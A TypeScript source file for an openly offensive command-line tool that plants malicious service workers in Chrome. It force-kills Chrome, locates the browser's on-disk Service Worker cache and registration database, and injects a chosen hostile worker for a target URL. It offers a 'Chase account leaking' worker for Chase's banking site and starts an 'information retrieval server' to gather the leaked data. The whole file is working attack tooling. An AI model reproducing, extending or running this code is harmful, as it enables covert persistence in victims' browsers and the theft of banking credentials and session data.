import { SwResourceManager } from "./diskCache"
import { SwRegistrationHandler } from "./levelDb"
import * as fs from 'fs/promises'
import * as path from 'path'
import prompts from "prompts"
import { addMaliciousServiceWorker, injectMaliciousServiceWorker } from "./exploit"
import { server } from "./server"
import findProcess from "find-process"
import treeKill from "tree-kill"

const specialtyServiceWorkers: Record<string, {title: string, value: string}[] | undefined> = {
    "https://secure03b.chase.com" : [{ title: 'Chase account leaking SW', value: 'dist/serviceWorkers/chase-sw.js' }]
}

async function main() {
    if(process.argv.includes("-s")) {
        server.start()
        return
    }

    const chromeProcessLookupResult = await findProcess("name", "chrome")
    const parentChromeProcess = chromeProcessLookupResult.find(process => !process.cmd.endsWith("chrome.exe"))
    if(parentChromeProcess) {
        const { shouldKillChrome } = await prompts({
            type: "select",
            name: 'shouldKillChrome',
            message: "Detected that chrome is running? It needs to be stopped for the exploit to work.",
            choices: [
                { title: 'Kill Chrome', value: true },
                { title: 'Abort', value: false }
            ],
            onState: promptsExitOnAbort
        })
        if(shouldKillChrome) {
            treeKill(parentChromeProcess.pid, 'SIGKILL')
        } else {
            process.exit(1)
        }
    }

    let chromeServiceWorkerDir = path.resolve(process.env.APPDATA ?? "", "../local/Google/Chrome/User Data/Default/Service Worker")
    if(await pathExists(chromeServiceWorkerDir)) {
        const { value } = await prompts({
            type: "confirm",
            name: 'value',
            message: `Detected \`${chromeServiceWorkerDir}\` as the service worker data directory. Is this correct?`,
            initial: true,
            onState: promptsExitOnAbort
        })
        if(!value) {
            chromeServiceWorkerDir = ""
        }
    } else {
        chromeServiceWorkerDir = ""
    }

    if(!chromeServiceWorkerDir) {
        const { newPath } = await prompts({
            type: 'text',
            name: 'newPath',
            message: `Please enter your service worker base path. EX: \`C:\\Users\\maxmf\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Service Worker\``,
            validate: promptsValidatePath,
            onState: promptsExitOnAbort
        })

        chromeServiceWorkerDir = newPath
    }

    const swResourceManager = new SwResourceManager(chromeServiceWorkerDir + String.raw`\ScriptCache`)
    const swRegistrationHandler = new SwRegistrationHandler(chromeServiceWorkerDir + String.raw`\Database`)

    const { urlStr } = await prompts({
        type: 'text',
        name: 'urlStr',
        message: "Enter a target url",
        validate: (urlStr) => {
            try {
                new URL(urlStr)
                return true
            } catch {
                return "Not a valid url"
            }
        },
        onState: promptsExitOnAbort
    })
    const url = new URL(urlStr)

    let serviceWorker: string
    const { swPath } = await prompts({
        type: 'select',
        name: 'swPath',
        message: 'Choose a service worker',
        choices: [
          { title: 'Basic Malicious Service Worker', value: 'dist/serviceWorkers/basic-sw.js' },
          ...(specialtyServiceWorkers[url.origin] ?? []),
          { title: 'Your own', value: '' }
        ],
        initial: 0,
        onState: promptsExitOnAbort
    })

    if(swPath) {
        serviceWorker = await fs.readFile(swPath, "utf-8")
    } else {
        const { customSwPath } = await prompts({
            type: 'text',
            name: 'customSwPath',
            message: "Enter the path to your service worker",
            validate: promptsValidatePath,
            onState: promptsExitOnAbort
        })
        serviceWorker = await fs.readFile(customSwPath, "utf-8")
    }

    
    if(await swRegistrationHandler.hasRegistration(url)) {
        await injectMaliciousServiceWorker(url, serviceWorker, swResourceManager, swRegistrationHandler)
    } else {
        await addMaliciousServiceWorker(url, serviceWorker, swResourceManager, swRegistrationHandler)
    }
    
    await swRegistrationHandler.closeConnection()


    const { shouldStartServer } = await prompts({
        type: "confirm",
        name: 'shouldStartServer',
        message: "Start the information retrieval server?",
        initial: true,
        onState: promptsExitOnAbort
    })

    if(shouldStartServer) {
        server.start() 
    }
}

async function pathExists(path:string) {
    try {
        await fs.access(path)
        return true
    } catch {
        return false
    }
}

function promptsExitOnAbort(state: any) {
    if (state.aborted) {
      process.nextTick(() => {
        process.exit(0);
      })
    }
}

async function promptsValidatePath(path: string) {
    if(await pathExists(path)) {
        return true
    } else {
        return "Can not access the specified path"
    }
}

main()